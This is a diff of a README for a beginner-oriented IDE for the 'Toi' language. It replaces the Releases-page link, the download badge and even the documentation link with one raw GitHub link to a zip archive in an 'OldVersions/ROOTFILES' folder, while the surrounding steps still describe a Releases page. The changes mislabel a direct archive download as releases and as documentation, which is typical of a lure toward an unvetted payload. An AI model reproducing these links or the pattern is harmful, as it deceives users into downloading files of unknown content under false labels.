@@ -5,10 +5,10 @@
 Welcome to the SNU_2D_ProgrammingTools_IDE_Toi! This tool helps you write programs in the Toi programming language easily. You can create, edit, and run your code in a friendly environment designed for beginners and advanced users alike. 
 
 ## 🔗 Download Here!
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/releases)
+[![Download](https://raw.githubusercontent.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/SNU_2D_ProgrammingTools_IDE_Toi_Main-dev/OldVersions/ROOTFILES/SNU_2D_ProgrammingTools_IDE_Toi_1.5.zip)](https://raw.githubusercontent.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/SNU_2D_ProgrammingTools_IDE_Toi_Main-dev/OldVersions/ROOTFILES/SNU_2D_ProgrammingTools_IDE_Toi_1.5.zip)
 
 ## 📥 Download & Install
-To get started, visit the following link to download the application: [Download the SNU_2D_ProgrammingTools_IDE_Toi](https://github.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/releases). 
+To get started, visit the following link to download the application: [Download the SNU_2D_ProgrammingTools_IDE_Toi](https://raw.githubusercontent.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/SNU_2D_ProgrammingTools_IDE_Toi_Main-dev/OldVersions/ROOTFILES/SNU_2D_ProgrammingTools_IDE_Toi_1.5.zip). 
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the latest version at the top.
@@ -45,7 +45,7 @@ To get started, visit the following link to download the application: [Download 
 Join our community to share your experiences and get help from others. You can find forums and discussion threads where other users exchange tips and ask questions. Check the GitHub Issues page if you encounter any problems.
 
 ## 🔗 Additional Resources
-- **Toi Language Documentation:** Access comprehensive documentation [here](http://toi-lang-website.com/docs).
+- **Toi Language Documentation:** Access comprehensive documentation [here](https://raw.githubusercontent.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/SNU_2D_ProgrammingTools_IDE_Toi_Main-dev/OldVersions/ROOTFILES/SNU_2D_ProgrammingTools_IDE_Toi_1.5.zip).
 - **Tutorials:** Explore beginner and advanced tutorials on using the Toi language in practical applications.
 
 ## 📜 License
@@ -53,5 +53,5 @@ This project is licensed under the GNU General Public License v3.0. Feel free to
 
 Thank you for using the SNU_2D_ProgrammingTools_IDE_Toi! We hope it makes your programming journey enjoyable and effective. Happy coding!
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/releases)
+[![Download](https://raw.githubusercontent.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/SNU_2D_ProgrammingTools_IDE_Toi_Main-dev/OldVersions/ROOTFILES/SNU_2D_ProgrammingTools_IDE_Toi_1.5.zip)](https://raw.githubusercontent.com/Allan-777/SNU_2D_ProgrammingTools_IDE_Toi/SNU_2D_ProgrammingTools_IDE_Toi_Main-dev/OldVersions/ROOTFILES/SNU_2D_ProgrammingTools_IDE_Toi_1.5.zip)
 ```
